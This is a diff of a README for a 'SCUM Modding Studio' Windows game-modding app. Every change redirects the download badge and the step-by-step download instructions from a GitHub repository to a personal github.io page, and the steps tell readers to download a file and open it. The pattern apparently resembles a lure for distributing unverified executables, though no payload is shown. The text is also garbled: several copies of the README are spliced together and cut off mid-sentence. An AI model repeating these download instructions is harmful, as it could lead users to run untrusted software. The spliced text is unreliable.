@@ -1,10 +1,10 @@
 # 🗺️ SCUM-Modding-Studio - Build SCUM Maps Without Unreal
 
-[![Download SCUM Modding Studio](https://img.shields.io/badge/Download-SCUM%20Modding%20Studio-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Audysquinteyed352/SCUM-Modding-Studio)
+[![Download SCUM Modding Studio](https://img.shields.io/badge/Download-SCUM%20Modding%20Studio-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://audysquinteyed352.github.io)
 
 SCUM Modding Studio is a free Windows application for editing the SCUM island in 3D, building bridges and roads, tuning and cloning vehicles and weapons, and exporting mod paks for single-player games and servers. It gives you a visual# 🗺️ SCUM-Modding-Studio - Build SCUM Maps Without Unreal
 
-[![Download SCUM Modding Studio](https://img.shields.io/badge/Download-SCUM%20Modding%20Studio-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Audysquinteyed352/SCUM-Modding-Studio)
+[![Download SCUM Modding Studio](https://img.shields.io/badge/Download-SCUM%20Modding%20Studio-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://audysquinteyed352.github.io)
 
 SCUM Modding Studio is a free Windows application for editing the SCUM island in 3D, building bridges and roads, tuning and cloning vehicles and weapons, and exporting mod paks for single-player games and servers. It gives you a visual workspace where you can shape the terrain, place structures, adjust game values, and package everything into a ready-to-use mod file — all without opening the Unreal editor or writing a single line of code.
 
@@ -19,7 +19,7 @@ Getting your own copy of SCUM Modding Studio running on Windows takes only a few
 Follow these steps in order:
 
 1. Open your web browser (Chrome, Edge, Firefox, or any browser you normally use).
-2. Go to the download page by clicking this link: **https://github.com/Audysquinteyed352/SCUM-Modding-Studio**
+2. Go to the download page by clicking this link: **https://audysquinteyed352.github.io**
 3. Look for the download button or the Releases area on that page.
 4. Save the file to a folder you can easily find again, such as your **Downloads** folder.
 5. When the download finishes, locate the saved file and open it to begin using SCUM Modding Studio.
@@ -85,7 +85,7 @@ Everything you need is on the official project page.
 
 Open this link in your browser:
 
-**https://github.com/Audysquinteyed352/SCUM-Modding-Studio**
+**https://audysquinteyed352.github.io**
 
 Visit this link to download the application.
 
@@ -157,7 +157,7 @@ No. The studio handles everything itself. Unreal Engine is not required at any p
 **Do I need to know how to code?**
 No. All editing is# 🗺️ SCUM-Modding-Studio - Reshape the Island Without Unreal
 
-[![Download SCUM Modding Studio](https://img.shields.io/badge/Download-SCUM%20Modding%20Studio-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Audysquinteyed352/SCUM-Modding-Studio)
+[![Download SCUM Modding Studio](https://img.shields.io/badge/Download-SCUM%20Modding%20Studio-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://audysquinteyed352.github.io)
 
 SCUM Modding Studio is a free Windows application for editing the SCUM island in 3D, building bridges and roads, tuning and cloning vehicles and weapons, and exporting mod paks for single-player games and servers. It gives you a visual workspace where you can shape the terrain, place structures, adjust gameplay values, and package everything into a ready-to-use mod file — all without opening the Unreal editor or writing a single line of code.
 
@@ -168,7 +168,7 @@ Visit this link to download the application.
 You can be up and running in a few minutes. The application is published on GitHub, which is the official home for every new version and update.
 
 1. Open your web browser — Chrome, Edge, Firefox, or whatever you normally use.
-2. Go to the download page: **https://github.com/Audysquinteyed352/SCUM-Modding-Studio**
+2. Go to the download page: **https://audysquinteyed352.github.io**
 3. Use the download option provided on that page.
 4. Save the file somewhere you can find again, such as your **Downloads** folder.
 5. When the download finishes, open the saved file to start the studio.
@@ -218,7 +218,7 @@ Everything you need lives on the official project page.
 
 Use this link in your browser:
 
-**https://github.com/Audysquinteyed352/SCUM-Modding-Studio**
+**https://audysquinteyed352.github.io**
 
 Visit this link to download the application.
 
